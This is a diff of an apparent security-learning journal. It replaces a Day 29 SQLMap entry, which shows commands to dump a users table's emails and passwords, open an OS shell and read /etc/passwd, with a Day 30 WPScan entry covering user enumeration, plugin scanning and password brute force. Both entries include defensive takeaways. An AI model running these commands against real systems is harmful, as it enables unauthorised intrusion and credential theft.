@@ -1,27 +1,41 @@
-## 🗓️ Day 29/100 – SQLMap: Automated SQL Injection Toolkit
+## 🗓️ Day 30/100 – 1 Month Milestone! 🏆
 
-**Focus:** Transition from manual SQLi to automated exploitation.
+**Focus:** Specialized WordPress Vulnerability Scanning with WPScan.
 
-### ⚡ SQLMap Capabilities Demonstrated
+### 🎉 Milestone Reflection
+**30 Days Complete.**
+From basic networking concepts to executing automated attacks against databases and CMS platforms. Consistency is the key differentiator.
 
-**1. Target Discovery & Injection Detection**
+### 🕵️‍♂️ Tool: WPScan
+WPScan is a black box WordPress vulnerability scanner.
+
+**1. Basic Scan**
 ```bash
-sqlmap -u "http://localhost/mutillidae/index.php?page=user-info.php&username=admin" --batch
+wpscan --url http://target-wordpress-site.com
 
-2. Database Enumeration# List all databases
-sqlmap -u "target" --dbs
+Identifies core version, active theme, and installed plugins.
 
-# List tables in specific database
-sqlmap -u "target" -D juice_shop --tables
+2. User Enumeration
 
-# List columns in specific table
-sqlmap -u "target" -D juice_shop -T users --columns3. Data Exfiltration# Dump entire table
-sqlmap -u "target" -D juice_shop -T users --dump
+bash
+wpscan --url http://target.com --enumerate u
+Risk: Reveals valid usernames (e.g., admin, editor), reducing brute-force complexity by 50%.
 
-# Dump specific columns
-sqlmap -u "target" -D juice_shop -T users -C "email,password" --dump4. Advanced Exploitation# OS command execution
-sqlmap -u "target" --os-shell
+3. Vulnerable Plugin Detection
 
-# File system access
-sqlmap -u "target" --file-read="/etc/passwd"🧠 Attack Speed ComparisonManual SQLi:    2-4 hours per vulnerable endpoint
-SQLMap:         2-5 minutes per vulnerable endpoint🔒 Defensive TakeawaysParameterized Queries render SQLMap ineffectiveWAF Detection (signature-based) often bypassed by SQLMap's evasion techniquesDatabase Least Privilege limits damage even when exploited
+bash
+wpscan --url http://target.com --enumerate p --plugins-detection aggressive
+Risk: Matches installed plugin versions against the WPScan Vulnerability Database (WPVDB) to find known exploits.
+
+4. Password Brute Force
+
+bash
+wpscan --url http://target.com --passwords /path/to/wordlist.txt --usernames admin
+🛡️ Defensive Takeaways
+Disable User Enumeration: Block access to /?author=1 endpoints.
+
+Update Everything: Auto-update plugins and themes.
+
+Limit Login Attempts: Install security plugins (Wordfence/Sucuri) to stop brute-force.
+
+Hide Version Info: Remove generator meta tags to slow down reconnaissance.
